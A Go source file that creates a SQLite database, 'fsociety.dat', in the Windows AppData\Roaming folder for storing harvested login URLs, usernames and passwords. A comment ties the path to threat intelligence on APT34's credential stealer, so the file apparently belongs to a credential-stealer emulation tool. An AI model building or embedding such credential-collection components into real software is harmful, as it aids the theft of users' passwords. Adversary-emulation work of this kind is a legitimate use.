// db.go
// package inspired by SQLite tutorial (https://gosamples.dev/sqlite-intro/)

package db

import (
	"database/sql"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"log"
	"os"
	"os/user"
)

var dbName = "fsociety.dat"

type SQLiteRepository struct {
	db *sql.DB
}

func NewSQLiteRepository(db *sql.DB) *SQLiteRepository {
	return &SQLiteRepository{
		db: db,
	}
}

func (r *SQLiteRepository) InsertLogin(url string, username string, password string) error {
	_, err := r.db.Exec("INSERT INTO logins(origin_url, username_value, password) values(?,?,?)", url, username, password)
	return err
}

func (r *SQLiteRepository) CreateLoginsTable() error {
	query := `
    CREATE TABLE IF NOT EXISTS logins(
    	origin_url VARCHAR NOT NULL,
        username_value VARCHAR,
        password VARCHAR
    );
    `

	_, err := r.db.Exec(query)
	return err
}

// Database filepath based on CTI
// Source: https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network
// Target: {homedir}\{username}\AppData\Roaming
func GetDBNameFilePath() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	path := fmt.Sprintf("%s\\AppData\\Roaming\\%s", user.HomeDir, dbName)
	return path
}

func InitializeDB() *SQLiteRepository {
	dbFilePath := GetDBNameFilePath()
	os.Remove(dbFilePath)

	db, err := sql.Open("sqlite3", dbFilePath)
	if err != nil {
		log.Fatal(err)
	}

	return NewSQLiteRepository(db)
}
